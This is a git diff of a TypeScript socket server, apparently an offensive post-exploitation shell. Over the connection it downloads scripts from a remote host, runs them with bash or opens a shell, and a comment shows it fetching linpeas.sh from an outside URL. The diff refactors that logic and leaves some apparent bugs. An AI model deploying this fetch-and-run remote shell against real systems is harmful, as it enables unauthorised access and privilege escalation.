@@ -218,41 +218,12 @@ class SnipeSocket {
     }
 
     this.prompt();
-
-    // const file = LOAD_MAP[target];
-    // const out = `${TMP_DIR}/${file}`;
-    // const url = `${WEB_HOST}/${file}`;
-    // const dir = path.dirname(out);
-
-    // if (!fs.existsSync(dir)) fs.mkdirSync(dir);
-
-    // msg('debug', `Fetching remote file: ${file} (${url} -> ${out})`);
-
-    // this.download(out, url, (err) => {
-    //   if (err) msg('error', err.message);
-    //   msg('debug', 'Download Completed');
-
-    //   if (!this.loaded) {
-    //     this.loaded = { target, file, out, url, dir, err };
-    //     PROMPT = colors.reset('💀 [') + colors['module'](this.loaded.target) + colors.reset('] ') + DEFAULT_PROMPT;
-    //   }
-
-    //   this.sock.write(NEWLINE);
-    //   this.sock.write(colors.green(`Loaded: ${target}`));
-    //   this.sock.write(NEWLINE);
-
-    //   this.prompt();
-    // });
   }
 
   public run(file, cb?: (code: number|null) => void) {
-    this.load(file, (code) => {
-      msg('debug', `Calling run, after load with code: ${code}`);
-
-      this.spawn('bash', [file], { shell: true, detached: true }, (code) => {
-        this.prompt();
-        if (cb) cb(code);
-      });
+    this.spawn('bash', [file], { shell: true, detached: true }, (code) => {
+      this.prompt();
+      if (cb) cb(code);
     });
   }
 
@@ -267,7 +238,7 @@ class SnipeSocket {
 
       response.on('data', (chunk) => {
         cur += chunk.length;
-        this.progress(`Download: ${url}`, cur, len, total);
+        this.progress(`Download: ${url} -> ${file}`, cur, len, total);
       });
 
       response.on('end', () => {
@@ -283,7 +254,7 @@ class SnipeSocket {
   }
 
   public progress(msg, cur, max, total) {
-    const stamp = colors.yellow(`${(100.0 * cur / max).toFixed(2)}% (${(cur / 1048576).toFixed(2)} MB) of total size: ${total.toFixed(2)} MB`);
+    const stamp = colors.yellow(`${msg} - ${(100.0 * cur / max).toFixed(2)}% (${(cur / 1048576).toFixed(2)} MB) of total size: ${total.toFixed(2)} MB`);
     this.sock.write(`\r${stamp}`);
   }
 
@@ -376,20 +347,9 @@ class SnipeSocket {
 
     if (this.inShell) return;
 
-    if (this.loaded) {
-      if (/^run$/i.test(cmd)) {
-        this.run(this.loaded.out);
-      } else if (/^stop|kill|back|exit$/i.test(cmd)) {
-        this.cp?.kill();
-        this.reset();
-      }
-    } else if (/^w?get|download$/i.test(cmd)) {
-      // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
-      if (args.length === 0) {
-        this.sock.write(colors['warn'](`Usage: get <file> [<url>]`));
-        this.prompt();
-      } else {
-        const name = args[0];
+    if (/^w?get|download$/i.test(cmd)) {
+      const doShit = () => {
+        const name = this.loaded.target || args[0];
         const file = `${TMP_DIR}/${name}`;
         const url = args[1] || `${WEB_HOST}/${name}`;
 
@@ -408,6 +368,43 @@ class SnipeSocket {
 
           this.prompt();
         });
+      };
+
+      // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
+      if (this.loaded) {
+        doShit();
+      } if (args.length === 0) {
+        this.sock.write(colors['warn'](`Usage: get <file> [<url>]`));
+        this.prompt();
+      } else {
+        doShit();
+      }
+    } else if (this.loaded) {
+      if (/^run$/i.test(cmd)) {
+        this.run(this.loaded.out);
+      // } else if (/^get|download$/i.test(cmd)) {
+      //   const name = LOAD_MAP[this.loaded.target];
+
+      //   if (!name) {
+      //     this.sock.write(colors['error'](`Missing/invalid target name: ${name}`));
+      //     this.prompt();
+      //     return;
+      //   }
+
+      //   const url = args[1] || `${WEB_HOST}/${name}`;
+
+      //   this.download(name, url, (err) => {
+      //     if (err) msg('error', `Failed downloading: ${url} -> ${name}`);
+
+      //     // LOAD_MAP[name] = name;
+
+      //     this.sock.write(NEWLINE);
+
+      //     this.prompt();
+      //   });
+      } else if (/^stop|kill|back|exit$/i.test(cmd)) {
+        this.cp?.kill();
+        this.reset();
       }
     } else if (/^sh|bash|shell$/i.test(cmd)) {
       this.shell();
@@ -454,6 +451,7 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
+    socket.reset();
     socket.welcome('welcome.txt');
 
     socket.sock.on('close', (hadError: boolean) => {
